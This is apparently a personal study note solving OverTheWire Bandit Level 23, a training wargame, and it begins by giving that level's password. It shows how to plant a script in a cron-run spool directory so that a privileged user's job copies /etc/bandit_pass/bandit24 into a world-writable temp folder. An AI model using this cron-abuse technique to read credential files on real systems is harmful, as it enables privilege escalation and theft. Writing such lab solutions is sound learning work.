**Password**: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
**Tools**: [[watch]], [[Bash scripting]], [[cron]]

**Prev**: [[Level 22]]
**Next**: [[Level 24]]
## Solution
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

The script is being executed in this level is
![[Pasted image 20250410104640.png]]
basically `bandit24` are executing all files which owner is `bandit23` (us), then we need create a script to read and save the password of `bandit24`
we need a space to write so u can create a temp directory with `mktemp -d`, and provide the permissions required for others can read write and execute inside.

```bash
chmod o+rwx /tmp/tmp.30cA3NpAiw$
```

then we can create a `script.sh`
```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.30cA3NpAiw$/bandit24.pass
```
and give it permissions of execution
```bash
chmod +x script.sh
```

with this we have all ready, just need copy `script.sh` to directory when cronjob are executing scripts `/var/spool/bandit24/foo/`
```bash
cp script.sh /var/spool/bandit24/foo/
```
and can use [[watch]] to listen when file `bandit24.pass` be created.
```bash
watch -n 1 'ls -la'
```
each sec the shell exec `ls -la` to display changes.